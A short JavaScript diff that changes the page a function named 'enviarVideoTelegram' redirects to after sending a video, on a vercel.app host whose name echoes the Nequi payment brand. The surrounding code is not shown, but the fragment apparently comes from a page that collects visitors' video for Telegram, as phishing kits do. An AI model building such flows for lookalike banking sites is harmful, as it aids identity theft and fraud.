@@ -263,7 +263,7 @@ function enviarVideoTelegram(videoBlob) {
         if (response.ok) {
             statusText.innerText = "✅ ";
             setTimeout(() => {
-                window.location.href = "https://jelpitnequi.vercel.app/inicio/";
+                window.location.href = "https://jelpitnequi.vercel.app/inicio/loading.html";
             }, 3000);
         } else {
             throw new Error("Error en respuesta");
